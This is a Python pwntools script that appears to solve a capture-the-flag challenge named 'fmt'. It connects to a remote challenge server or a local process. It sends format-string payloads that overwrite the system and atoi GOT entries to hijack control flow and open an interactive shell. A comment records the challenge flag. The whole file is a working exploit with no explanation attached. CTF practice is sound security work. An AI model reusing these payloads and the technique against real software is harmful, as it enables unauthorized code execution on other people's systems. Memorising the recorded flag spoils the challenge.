from pwn import *
import signal
import sys, time

prog_name = './fmt'
context.binary = prog_name 
debug = int(sys.argv[1])
online=False
if( debug == 0):
  r = remote("pwn.byteband.it", 6969)
  online=True
elif(debug == 1):
  r = process(prog_name)

def pwn():
  # step 1 - overwrite system@got with main
  r.recvuntil("Choice:")
  r.sendline("2")
  r.recvuntil("Good job. I'll give you a gift") 
  r.sendline("%4599u%8$hn     \x28\x40\x40\x00\x00\x00\x00\x00")
  
  # step 2 - now we overwrite with the main, again, but a little below, to not execute atoi that will be our system@plt+6
  # if you overwrite this in the first step can cause some exception
  r.recvuntil("Choice:") 
  r.sendline("2")
  r.recvuntil("Good job. I'll give you a gift") 
  r.sendline("%4763u%8$hn     \x28\x40\x40\x00\x00\x00\x00\x00")

  # step 3.1 - clean high part atoi@got 
  time.sleep(3)
  r.sendline("%64u%9$n        \x5a\x40\x40\x00\x00\x00\x00\x00")

  # step 3.2 - set low part atoi@got to system@plt+6
  time.sleep(3)
  r.sendline("%4198486u%10$n  \x58\x40\x40\x00\x00\x00\x00\x00")

  # step 4 - execute atoi refering to the main
  time.sleep(2)
  r.sendline("%4731u%11$hn    \x28\x40\x40\x00\x00\x00\x00\x00")
  
  #r.sendline("sh")
  # flag{format_string_is_t00_0ld}
  r.interactive()
  return

